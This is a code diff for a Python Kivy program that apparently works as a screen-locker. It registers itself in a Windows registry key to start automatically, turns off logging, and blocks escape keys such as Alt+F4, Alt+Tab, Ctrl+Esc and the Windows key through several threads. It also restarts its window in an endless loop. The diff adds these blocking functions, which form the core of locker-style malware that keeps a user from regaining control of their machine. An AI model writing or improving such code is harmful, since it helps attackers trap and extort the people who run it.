@@ -13,6 +13,8 @@ key_my = OpenKey(HKEY_CURRENT_USER,
                  0, KEY_ALL_ACCESS)
 SetValueEx(key_my, 'script', 0, REG_SZ, __file__)
 CloseKey(key_my)
+from kivy.logger import Logger,LOG_LEVELS
+Logger.setLevel(LOG_LEVELS["critical"])
 from kivy.app import App
 from kivy.uix.floatlayout import FloatLayout
 from kivy.uix.boxlayout import BoxLayout
@@ -37,12 +39,42 @@ class main(App):
         bl1.add_widget(bth1)
         fl1.add_widget(bl1)
         return fl1;
-def lock_keyboard():
+def lock_key_esc():
     from keyboard import block_key,add_hotkey
-    add_hotkey("esc",lambda: None,suppress =True)
-    add_hotkey("windows",lambda: None,suppress =True)
+    while True:
+        add_hotkey("esc",lambda: None,suppress =True)
+def lock_key_windows():
+    from keyboard import block_key,add_hotkey
+    while True:
+        add_hotkey("windows",lambda: None,suppress =True)
+def lock_key_alt_f4():
+    from keyboard import block_key,add_hotkey
+    while True:
+        add_hotkey("alt+f4",lambda: None,suppress =True)
+def lock_key_alt_tab():
+    from keyboard import block_key,add_hotkey
+    while True:
+        add_hotkey("alt+tab",lambda: None,suppress =True)
+def lock_key_ctrl_delete():
+    from keyboard import block_key,add_hotkey
+    while True:
+        add_hotkey("ctrl+delete",lambda: None,suppress =True)
+def lock_key_ctrl_esc():
+    from keyboard import block_key,add_hotkey
+    while True:
+        add_hotkey("ctrl+esc",lambda: None,suppress =True)
 if __name__=='__main__':
-    th1=Thread(target=lock_keyboard,daemon=True)
+    th1=Thread(target=lock_key_esc,daemon=True)
     th1.start()
+    th2=Thread(target=lock_key_windows,daemon=True)
+    th2.start()
+    th3=Thread(target=lock_key_alt_f4,daemon=True)
+    th3.start()
+    th4=Thread(target=lock_key_alt_tab,daemon=True)
+    th4.start()
+    th5=Thread(target=lock_key_ctrl_delete,daemon=True)
+    th5.start()
+    th6=Thread(target=lock_key_ctrl_esc,daemon=True)
+    th6.start()
     while True:
         main().run()
